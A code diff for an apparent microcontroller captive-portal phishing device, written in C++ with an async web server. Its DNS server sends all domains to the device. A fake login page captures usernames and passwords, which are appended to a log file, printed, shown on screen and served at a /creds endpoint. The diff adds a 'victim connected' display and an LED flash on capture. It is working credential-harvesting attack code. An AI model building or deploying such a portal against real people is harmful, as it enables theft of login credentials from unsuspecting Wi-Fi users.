@@ -8,8 +8,7 @@ WebServer::WebServer() {
 
 const String localIPURL = "http://4.3.2.1";
 
-void WebServer::setUpDNSServer(DNSServer &dnsServer, IPAddress ip)
-{
+void WebServer::setUpDNSServer(DNSServer &dnsServer, IPAddress ip) {
   dnsServer.setTTL(3600);
   dnsServer.start(53, "*", ip);
 }
@@ -35,7 +34,7 @@ void handleCredsRequest(AsyncWebServerRequest *request) {
 void logLoginAttempt(String username, String password) {
   // Open the log file in write mode and append if it exists, create it if not
   File logFile = LittleFS.open("/login.log", "a");
-  
+
   if (!logFile) {
     Serial.println("Failed to open login.log file for writing");
     return;
@@ -46,7 +45,7 @@ void logLoginAttempt(String username, String password) {
   logFile.close();
 }
 
-void WebServer::setUpWebserver(AsyncWebServer &server, IPAddress ip){
+void WebServer::setUpWebserver(AsyncWebServer &server, IPAddress ip) {
   server.on("/connecttest.txt", [](AsyncWebServerRequest *request) {
     request->redirect("http://logout.net");
   });  // windows 11 captive portal workaround
@@ -85,7 +84,8 @@ void WebServer::setUpWebserver(AsyncWebServer &server, IPAddress ip){
     response->addHeader("Cache-Control", "public,max-age=31536000");  // save this file to cache for 1 year (unless you refresh)
     request->send(response);
     Serial.println("Captive Portal Open");
-    NeoPixel::setNeoPixelColour("cyan");
+    Screen::displayVictimConnected();
+      NeoPixel::setNeoPixelColour("cyan");
   });
 
   server.on("/login", HTTP_POST, [&server](AsyncWebServerRequest *request) {
@@ -97,7 +97,8 @@ void WebServer::setUpWebserver(AsyncWebServer &server, IPAddress ip){
     Serial.println("captured details " + username + " " + password);
 
     Screen::displayCredsFound(username, password);
-    NeoPixel::setNeoPixelColour("red");
+    std::vector<String> colors = { "red", "yellow", "off" };
+    NeoPixel::flash(3, colors, "red");
   });
 
   server.on("/creds", HTTP_GET, handleCredsRequest);
@@ -112,6 +113,3 @@ void WebServer::setUpWebserver(AsyncWebServer &server, IPAddress ip){
     Serial.print(" sent redirect to " + localIPURL + "\n");
   });
 }
-
-
-
